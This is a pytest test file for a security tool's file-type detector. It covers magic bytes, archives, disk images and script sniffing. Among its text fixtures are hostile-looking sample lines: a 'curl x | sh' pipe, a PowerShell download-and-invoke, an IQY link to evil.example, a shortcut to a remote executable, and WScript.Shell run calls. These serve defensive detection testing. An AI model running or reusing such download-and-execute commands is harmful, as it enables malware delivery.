from __future__ import annotations

import bz2
import gzip
import lzma
import re
import struct
from pathlib import Path

import pytest

from centinela.parsing.filetype import (
    ALL_TYPES,
    detect_type,
    file_extension,
    is_container,
    is_text_like,
)
from tests.helpers import build_eml, eicar
from tests.parsing import samples


def _iso9660_at(offset: int) -> bytes:
    data = bytearray(offset + 0x800)
    data[offset : offset + 5] = b"CD001"
    return bytes(data)


def _udf_only() -> bytes:
    data = bytearray(0x8001 + 0x800 * 4)
    data[0x8001:0x8006] = b"BEA01"
    data[0x8801:0x8806] = b"NSR02"
    data[0x9001:0x9006] = b"TEA01"
    return bytes(data)


def _vhd_fixed() -> bytes:
    footer = bytearray(512)
    footer[0:8] = b"conectix"
    return b"\x00" * 4096 + bytes(footer)


def _fat_img() -> bytes:
    boot = bytearray(512)
    boot[0:3] = b"\xeb\x3c\x90"
    boot[0x36:0x3B] = b"FAT12"
    boot[510:512] = b"\x55\xaa"
    return bytes(boot) + b"\x00" * 4096


def _tar() -> bytes:
    return samples.tar_bytes({"a.txt": b"hola"})


def _bmp() -> bytes:
    return b"BM" + struct.pack("<IHHI", 70, 0, 0, 54) + struct.pack("<I", 40) + b"\x00" * 60


def _ids(cases):
    return [f"{i}-{exp}-{fn}" for i, (exp, _, fn) in enumerate(cases)]


MAGIC_CASES = [
    ("pe", samples.minimal_pe(), "factura.pdf"),  # magic manda sobre la extensión engañosa
    ("pe", samples.minimal_pe(), None),
    ("elf", b"\x7fELF\x02\x01\x01" + b"\x00" * 60, "x"),
    ("macho", b"\xcf\xfa\xed\xfe" + b"\x00" * 60, "x"),
    ("msi", samples.ole_bytes(samples.MSI_CLSID), "setup.msi"),
    ("msi", samples.ole_bytes(samples.MSI_CLSID), "factura.doc"),
    ("ole", samples.ole_bytes(), "factura.doc"),
    (
        "ooxml",
        samples.zip_bytes({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>"}),
        "f.docx",
    ),
    ("ooxml", samples.zip_bytes({"[Content_Types].xml": b"<Types/>"}), "f.zip"),
    (
        "jar",
        samples.zip_bytes({"META-INF/MANIFEST.MF": b"Main-Class: A\n", "A.class": b"\xca\xfe\xba\xbe"}),
        "a.jar",
    ),
    ("jar", samples.zip_bytes({"A.class": b"\xca\xfe\xba\xbe\x00\x00\x00\x34"}), "a.jar"),
    ("zip", samples.zip_bytes({"a.txt": b"hola"}), "a.zip"),
    ("zip", samples.zip_bytes({"A.class": b"x"}), "a.zip"),
    ("rtf", b"{\\rtf1\\ansi hola}", "f.doc"),
    ("rtf", b"{\\rt\\x hola}", None),
    ("pdf", b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj", "f.pdf"),
    ("pdf", b"\x00" * 500 + b"%PDF-1.4\n", "f.bin"),
    ("onenote", samples.onenote_bytes([b"hola"]), "f.one"),
    ("chm", b"ITSF\x03\x00\x00\x00" + b"\x00" * 50, "ayuda.chm"),
    ("lnk", samples.LNK_HEADER + b"\x00" * 60, "factura.pdf.lnk"),
    ("7z", samples.seven_zip({"a.txt": b"hola"}), "a.7z"),
    ("rar", samples.RAR_STORED, "a.rar"),
    ("rar", b"Rar!\x1a\x07\x00" + b"\x00" * 20, "a.rar"),
    ("gzip", gzip.compress(b"hola"), "a.gz"),
    ("bzip2", bz2.compress(b"hola"), "a.bz2"),
    ("xz", lzma.compress(b"hola"), "a.xz"),
    ("tar", _tar(), "a.tar"),
    ("cab", samples.cab_bytes([("a.txt", b"hola")]), "a.cab"),
    ("iso", _iso9660_at(0x8001), "factura.img"),
    ("iso", _iso9660_at(0x8801), "x"),
    ("iso", _iso9660_at(0x9001), "x"),
    ("udf", _udf_only(), "x.iso"),
    ("vhd", _vhd_fixed(), "disco.vhd"),
    ("vhd", b"conectix" + b"\x00" * 600, "disco.vhd"),
    ("vhdx", b"vhdxfile" + b"\x00" * 600, "disco.vhdx"),
    ("img", _fat_img(), "disquete.img"),
    ("image/png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 20, "logo.png"),
    ("image/jpeg", b"\xff\xd8\xff\xe0" + b"\x00" * 20, "foto.jpg"),
    ("image/gif", b"GIF89a" + b"\x00" * 20, "a.gif"),
    ("image/bmp", _bmp(), "a.bmp"),
    ("image/webp", b"RIFF\x00\x00\x00\x00WEBPVP8 " + b"\x00" * 20, "a.webp"),
    ("image/ico", b"\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00" + b"\x00" * 30, "favicon.ico"),
]


@pytest.mark.parametrize(("expected", "data", "filename"), MAGIC_CASES, ids=_ids(MAGIC_CASES))
def test_magic_detection(expected, data, filename):
    assert detect_type(data, filename) == expected


TEXT_CASES = [
    # por extensión (el contenido es texto)
    ("script/js", b"var x = 1;", "factura.js"),
    ("script/js", b"#@~^AAAAAA==", "a.jse"),
    ("script/vbs", b"MsgBox 1", "a.vbs"),
    ("script/vbs", b"#@~^AAAAAA==", "a.vbe"),
    ("script/ps1", b"Write-Host 1", "a.ps1"),
    ("script/bat", b"echo 1", "a.bat"),
    ("script/bat", b"echo 1", "a.CMD"),
    ("script/wsf", b"<job><script>x</script></job>", "a.wsf"),
    ("script/hta", b"<html><body>hola</body></html>", "pago.hta"),
    ("script/vba", b"Sub X()\nEnd Sub", "m.bas"),
    ("script/python", b"print(1)", "a.py"),
    ("script/sh", b"echo 1", "a.sh"),
    ("html", b"hola", "a.htm"),
    ("svg", b"<svg></svg>", "a.svg"),
    ("xml", b"<a/>", "a.xml"),
    ("url_shortcut", b"[InternetShortcut]\r\nURL=file://1.2.3.4/x.exe", "a.url"),
    ("iqy", b"WEB\r\n1\r\nhttp://x/y", "a.iqy"),
    ("slk", b"ID;P\r\nC;Y1;X1;EEXEC", "a.slk"),
    ("reg", b"Windows Registry Editor Version 5.00", "a.reg"),
    ("settingcontent", b"<PCSettings/>", "a.settingcontent-ms"),
    ("library-ms", b"<libraryDescription/>", "a.library-ms"),
    ("search-ms", b"<searchConnectorDescription/>", "a.searchConnector-ms"),
    ("script/js", b"var x = 1;", "factura.pdf.js "),  # Windows ignora espacios/puntos finales
    # sin extensión útil: olfateo de contenido
    ("html", b"<!DOCTYPE html><html><body><form action=x></form></body></html>", None),
    ("html", b"\xef\xbb\xbf<html><head></head></html>", "documento"),
    ("svg", b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"></svg>', None),
    ("xml", b'<?xml version="1.0"?><root/>', None),
    ("script/hta", b'<html><HTA:APPLICATION id="x"/><script language="VBScript">x</script></html>', "x.txt"),
    ("script/wsf", b'<job id="a"><script language="JScript">WScript.Echo(1)</script></job>', None),
    ("library-ms", b'<?xml version="1.0"?><libraryDescription xmlns="x"></libraryDescription>', None),
    ("search-ms", b'<?xml version="1.0"?><searchConnectorDescription/>', None),
    ("settingcontent", b"<?xml version='1.0'?><PCSettings><SearchableContent/></PCSettings>", None),
    ("url_shortcut", b"[InternetShortcut]\nURL=https://x", None),
    ("reg", b"REGEDIT4\n[HKEY_CURRENT_USER\\x]", None),
    ("slk", b"ID;PWXL;N;E\nC;X1;Y1;K0;EEXEC()", None),
    ("iqy", b"WEB\n1\nhttps://evil.example/q.txt\n", None),
    ("script/sh", b"#!/bin/bash\ncurl x | sh\n", None),
    ("script/python", b"#!/usr/bin/env python3\nimport os\n", None),
    (
        "script/ps1",
        b"$wc = New-Object Net.WebClient\nIEX $wc.DownloadString('http://x')\nStart-Process calc",
        "leeme.txt",
    ),
    ("script/ps1", "$a = Get-Item x\r\nInvoke-Expression $a".encode("utf-16"), None),  # UTF-16 con BOM
    ("script/bat", b"@echo off\r\nset x=1\r\nstart /b x.exe\r\n", None),
    ("script/vbs", b'Dim s\nSet s = CreateObject("WScript.Shell")\ns.Run "calc"\n', None),
    ("script/js", b'var sh = new ActiveXObject("WScript.Shell");\nsh.Run("calc");\n', None),
    ("script/vba", b'Attribute VB_Name = "Module1"\nSub AutoOpen()\nEnd Sub', None),
    ("script/python", b"import os\nimport sys\n\ndef main():\n    os.system('x')\n", "x.txt"),
    ("eml", build_eml(subject="Hola", text="cuerpo"), None),
    ("eml", build_eml(subject="Hola", text="cuerpo"), "reenviado.eml"),
    ("eml", b"MIME-Version: 1.0\nContent-Type: multipart/related; boundary=x\n\n--x--", "pagina.mht"),
    ("text", b"Hola, te mando el presupuesto. Saludos.", None),
    ("text", b"Hola, te mando el presupuesto.", "notas.txt"),
    ("text", "Año de facturación: 2024 – ñandú".encode("cp1252"), None),
    ("text", eicar(), "eicar.com"),  # EICAR es texto ASCII: lo detectan ClamAV/YARA, no el tipo
    ("text", b"From: alguien\n\nno es un mail completo", None),
    ("text", b"id;nombre;precio\n1;x;2", "precios.csv"),  # CSV que empieza con "id;" no es SYLK
]


@pytest.mark.parametrize(("expected", "data", "filename"), TEXT_CASES, ids=_ids(TEXT_CASES))
def test_text_detection(expected, data, filename):
    assert detect_type(data, filename) == expected


NEGATIVE_CASES = [
    ("unknown", b"", "factura.exe"),
    ("unknown", b"MZ" + b"\x00" * 10, "factura.exe"),  # MZ sin cabecera PE válida
    ("unknown", b"MZ" + b"\x00" * 58 + b"\xff\xff\xff\x7f" + b"\x00" * 64, "x.exe"),  # e_lfanew absurdo
    ("unknown", bytes(range(256)) * 4, "x.js"),  # binario con extensión de script: NO es script
    ("unknown", b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + b"\x00" * 40, "A.class"),  # Java class, no Mach-O
    ("unknown", b"\x00\x01\x02\x03" * 100, None),
]


@pytest.mark.parametrize(("expected", "data", "filename"), NEGATIVE_CASES, ids=_ids(NEGATIVE_CASES))
def test_non_detection(expected, data, filename):
    assert detect_type(data, filename) == expected


def test_zip_with_prepended_garbage_is_still_zip():
    data = b"\x01\x02\x03garbage-not-text\x00\xff" * 10 + samples.zip_bytes({"a.exe": samples.minimal_pe()})
    assert detect_type(data, "x.bin") == "zip"


def test_truncated_ooxml_still_detected_from_local_headers():
    data = samples.zip_bytes({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"x" * 1000})
    truncated = data[: len(data) // 2]  # sin central directory
    assert detect_type(truncated, "f.docx") == "ooxml"


def test_utf16le_without_bom_reg_file():
    data = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software]".encode("utf-16-le")
    assert detect_type(data, None) == "reg"


@pytest.mark.parametrize(
    "data",
    [
        b"\xff" * 10,
        b"PK\x03\x04" + b"\x00" * 3,
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\xff" * 600,
        b"%PDF",
        b"{\\rt",
    ],
    ids=["ff", "pk-trunc", "ole-garbage", "pdf-magic", "rtf-magic"],
)
def test_hostile_inputs_never_raise(data):
    assert detect_type(data, "x") in ALL_TYPES


def test_every_result_is_in_vocabulary():
    for _, data, filename in MAGIC_CASES + TEXT_CASES + NEGATIVE_CASES:
        assert detect_type(data, filename) in ALL_TYPES


_ARCHITECTURE = Path(__file__).resolve().parents[2] / "docs" / "ARCHITECTURE.md"


def _documented_types() -> set[str]:
    """Valores de la PRIMERA columna de la tabla de vocabulario de `Artifact.detected_type` en ARCHITECTURE.md."""
    text = _ARCHITECTURE.read_text(encoding="utf-8")
    section = text.split("## Vocabulario de `Artifact.detected_type`", 1)[1].split("\n## ", 1)[0]
    values: set[str] = set()
    for line in section.splitlines():
        cells = line.split("|")
        if len(cells) < 3 or set(cells[1].strip()) <= {"-", ""} or cells[1].strip() == "valor":
            continue
        values |= set(re.findall(r"`([^`]+)`", cells[1]))
    return values


@pytest.mark.skipif(not _ARCHITECTURE.exists(), reason="docs/ARCHITECTURE.md no está en esta copia")
def test_vocabulary_matches_architecture_doc():
    documented = _documented_types() - {"dotnet"}  # documentado explícitamente como "NO se usa"
    assert "script/hta" in documented
    assert documented == set(ALL_TYPES)


def test_hta_vocabulary_is_script_hta():
    # una aplicación HTML (.hta) la ejecuta mshta.exe con permisos de programa: es un script, no "html"
    assert detect_type(b"<html><body>hola</body></html>", "factura.hta") == "script/hta"
    hta = b'<html><HTA:APPLICATION id="x"/><script language="VBScript">x</script></html>'
    assert detect_type(hta, None) == "script/hta"
    assert detect_type(hta, "pagina.html") == "html"  # un .html con la etiqueta HTA abre en el navegador
    assert "script/hta" in ALL_TYPES


def test_helpers():
    assert is_container("zip") and is_container("iso") and is_container("jar")
    assert not is_container("ooxml") and not is_container("pdf") and not is_container("pe")
    assert is_text_like("script/ps1") and is_text_like("html") and is_text_like("eml")
    assert not is_text_like("pe") and not is_text_like("zip")
    assert file_extension("Factura.PDF.exe") == "exe"
    assert file_extension("factura.exe. . ") == "exe"
    assert file_extension("sin_extension") == ""
    assert file_extension(None) == ""
    assert file_extension("dir.d/archivo") == ""
